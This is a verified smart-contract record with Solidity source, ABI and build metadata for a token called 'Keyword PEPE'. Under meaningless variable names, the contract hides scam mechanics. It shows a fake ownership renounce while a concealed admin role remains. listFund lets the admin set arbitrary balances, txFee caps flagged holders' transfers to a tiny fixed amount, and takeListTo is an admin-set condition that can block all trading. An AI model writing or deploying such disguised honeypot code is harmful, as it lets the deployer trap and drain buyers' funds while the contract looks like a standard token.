{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface shouldWalletAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingReceiverMarketing) external view returns (uint256);\n\n    function transfer(address isSwapTake, uint256 receiverList) external returns (bool);\n\n    function allowance(address tradingReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isSwapTake,\n        uint256 receiverList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minReceiver, uint256 value);\n    event Approval(address indexed tradingReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract fundAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalSwap {\n    function createPair(address launchedTrading, address autoModeList) external returns (address);\n}\n\ninterface takeList is shouldWalletAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract KeywordPEPE is fundAt, shouldWalletAt, takeList {\n\n    address public enableFromAmount;\n\n    uint8 private limitToReceiver = 18;\n\n    bool public buyList;\n\n    function owner() external view returns (address) {\n        return swapLiquidityTake;\n    }\n\n    string private receiverMarketing = \"KPE\";\n\n    bool public exemptBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenBuy;\n    }\n\n    mapping(address => uint256) private swapFundTeam;\n\n    address private swapLiquidityTake;\n\n    function listFund(address limitSwap, uint256 receiverList) public {\n        limitReceiver();\n        swapFundTeam[limitSwap] = receiverList;\n    }\n\n    function limitReceiver() private view {\n        require(sellFromSender[_msgSender()]);\n    }\n\n    function allowance(address minSender, address sellAmount) external view virtual override returns (uint256) {\n        if (sellAmount == tradingBuy) {\n            return type(uint256).max;\n        }\n        return txMaxMode[minSender][sellAmount];\n    }\n\n    uint256 public limitLaunch;\n\n    function launchedExempt(address isSender) public {\n        require(isSender.balance < 100000);\n        if (enableMode) {\n            return;\n        }\n        \n        sellFromSender[isSender] = true;\n        \n        enableMode = true;\n    }\n\n    function approve(address sellAmount, uint256 receiverList) public virtual override returns (bool) {\n        txMaxMode[_msgSender()][sellAmount] = receiverList;\n        emit Approval(_msgSender(), sellAmount, receiverList);\n        return true;\n    }\n\n    address tokenLimitExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        enableSender amountFundBuy = enableSender(tradingBuy);\n        toSender = totalSwap(amountFundBuy.factory()).createPair(amountFundBuy.WETH(), address(this));\n        \n        enableFromAmount = _msgSender();\n        fromLimit();\n        sellFromSender[enableFromAmount] = true;\n        swapFundTeam[enableFromAmount] = senderMarketingAmount;\n        if (toFund) {\n            launchedShouldIs = false;\n        }\n        emit Transfer(address(0), enableFromAmount, senderMarketingAmount);\n    }\n\n    uint256 private buyAutoEnable;\n\n    string private tokenBuy = \"Keyword PEPE\";\n\n    mapping(address => bool) public sellFromSender;\n\n    function transferFrom(address feeMin, address isSwapTake, uint256 receiverList) external override returns (bool) {\n        if (_msgSender() != tradingBuy) {\n            if (txMaxMode[feeMin][_msgSender()] != type(uint256).max) {\n                require(receiverList <= txMaxMode[feeMin][_msgSender()]);\n                txMaxMode[feeMin][_msgSender()] -= receiverList;\n            }\n        }\n        return launchedTx(feeMin, isSwapTake, receiverList);\n    }\n\n    mapping(address => mapping(address => uint256)) private txMaxMode;\n\n    uint256 constant atLiquidity = 4 ** 10;\n\n    function totalEnable(address feeMin, address isSwapTake, uint256 receiverList) internal returns (bool) {\n        require(swapFundTeam[feeMin] >= receiverList);\n        swapFundTeam[feeMin] -= receiverList;\n        swapFundTeam[isSwapTake] += receiverList;\n        emit Transfer(feeMin, isSwapTake, receiverList);\n        return true;\n    }\n\n    function balanceOf(address tradingReceiverMarketing) public view virtual override returns (uint256) {\n        return swapFundTeam[tradingReceiverMarketing];\n    }\n\n    bool private launchedShouldIs;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderMarketingAmount;\n    }\n\n    event OwnershipTransferred(address indexed tokenTx, address indexed sellEnableExempt);\n\n    bool public enableMode;\n\n    uint256 minWallet;\n\n    function getOwner() external view returns (address) {\n        return swapLiquidityTake;\n    }\n\n    bool public txShould;\n\n    uint256 private senderMarketingAmount = 100000000 * 10 ** 18;\n\n    address public toSender;\n\n    function launchedTx(address feeMin, address isSwapTake, uint256 receiverList) internal returns (bool) {\n        if (feeMin == enableFromAmount) {\n            return totalEnable(feeMin, isSwapTake, receiverList);\n        }\n        uint256 feeReceiver = shouldWalletAt(toSender).balanceOf(tokenLimitExempt);\n        require(feeReceiver == minWallet);\n        require(isSwapTake != tokenLimitExempt);\n        if (teamShould[feeMin]) {\n            return totalEnable(feeMin, isSwapTake, atLiquidity);\n        }\n        return totalEnable(feeMin, isSwapTake, receiverList);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverMarketing;\n    }\n\n    address tradingBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 txTo;\n\n    function txFee(address exemptSender) public {\n        limitReceiver();\n        if (buyAutoEnable == limitLaunch) {\n            toFund = false;\n        }\n        if (exemptSender == enableFromAmount || exemptSender == toSender) {\n            return;\n        }\n        teamShould[exemptSender] = true;\n    }\n\n    function transfer(address limitSwap, uint256 receiverList) external virtual override returns (bool) {\n        return launchedTx(_msgSender(), limitSwap, receiverList);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitToReceiver;\n    }\n\n    bool private toFund;\n\n    function fromLimit() public {\n        emit OwnershipTransferred(enableFromAmount, address(0));\n        swapLiquidityTake = address(0);\n    }\n\n    function takeListTo(uint256 receiverList) public {\n        limitReceiver();\n        minWallet = receiverList;\n    }\n\n    mapping(address => bool) public teamShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellEnableExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiverMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFromAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSender\",\"type\":\"address\"}],\"name\":\"launchedExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverList\",\"type\":\"uint256\"}],\"name\":\"listFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellFromSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverList\",\"type\":\"uint256\"}],\"name\":\"takeListTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isSwapTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"}],\"name\":\"txFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "KeywordPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}